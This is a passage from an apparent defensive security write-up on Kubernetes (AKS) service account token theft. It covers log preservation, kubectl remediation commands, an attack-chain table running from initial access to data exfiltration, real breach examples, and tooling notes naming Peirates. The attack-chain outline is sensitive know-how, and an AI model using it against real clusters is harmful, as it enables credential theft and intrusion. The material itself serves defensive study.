   - Open **Azure Portal** → **Log Analytics Workspaces** → **Logs**
   - Run KQL query to export audit logs
   - Download and preserve logs for forensic analysis

3. **Remediate (Within 24 Hours):**
   **Command:**
   ```bash
   # Revoke all tokens for the affected service account
   kubectl delete secret -l serviceaccount=<sa-name> --namespace <namespace>
   
   # Reset the service account
   kubectl delete serviceaccount <sa-name> --namespace <namespace>
   kubectl create serviceaccount <sa-name> --namespace <namespace>
   
   # Re-bind RBAC roles if needed
   kubectl create rolebinding <rb-name> --clusterrole=<role> --serviceaccount=<namespace>:<sa-name>
   ```
   **Manual:**
   - Go to **AKS Cluster** → **Workloads** → **Service Accounts**
   - Delete the compromised service account
   - Recreate with restricted permissions

---

## 9. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-004] Kubelet API Unauthorized Access | Attacker gains access to exposed Kubernetes API or container |
| **2** | **Persistence** | [LM-AUTH-030] **AKS Service Account Token Theft** | **Current Step: Token extracted from pod filesystem** |
| **3** | **Lateral Movement** | [LM-AUTH-031] Container Registry Cross-Registry | Token used to access ACR in different tenant |
| **4** | **Impact** | [LM-AUTH-032] Function App Identity Hopping | Token used to chain to Azure Function App identity |
| **5** | **Impact** | Data Exfiltration via Stolen Credentials | Secrets and data extracted using escalated permissions |

---

## 10. Real-World Examples

### Example 1: Capital One Cloud Breach (2019)
- **Target:** Financial Services (Capital One Bank)
- **Timeline:** July 2019
- **Technique Status:** SSRF vulnerability in AWS Metadata Service led to IAM role compromise; similar to Kubernetes service account token theft
- **Impact:** 100 million customer records breached; $80 million fine
- **Reference:** [Capital One Data Breach Report](https://www.capitalone.com/security-incident/)

### Example 2: Tesla Kubernetes Cluster Compromise (2018)
- **Target:** Cloud Infrastructure (Cryptocurrency Mining)
- **Timeline:** Early 2018
- **Technique Status:** Exposed Kubernetes API + default credentials + unrestrictive RBAC allowed full cluster compromise
- **Impact:** Cryptocurrency miners installed on cluster; significant compute resource theft
- **Reference:** [Lacework: Kubernetes Container Escapes and Mining](https://www.lacework.com/)

### Example 3: Shopify GKE Workload Identity Attack (2018)
- **Target:** Cloud Infrastructure (E-commerce)
- **Timeline:** 2018
- **Technique Status:** Service account tokens combined with metadata service access enabled privilege escalation to cluster admin
- **Impact:** Researchers demonstrated ability to read all secrets and user data from cluster
- **Reference:** [4Armed & Shopify: TLS Bootstrap Token Theft](https://www.4armed.io/blog/kubernetes-privilege-escalation/)

---

## Metadata Notes

- **Atomic Red Team:** No official atomic test exists; see Peirates tool for simulation
- **Tool Dependencies:** Requires kubectl, curl, or specialized tools like Peirates for automated attacks
- **Mitigation Complexity:** Medium – Requires configuration changes across all pods and cluster-wide audit logging setup
- **Detection Difficulty:** High if audit logging is disabled; Medium-High if enabled
- **CVSS Score:** 7.5 (High) – Requires prior container compromise but enables significant lateral movement and data theft

---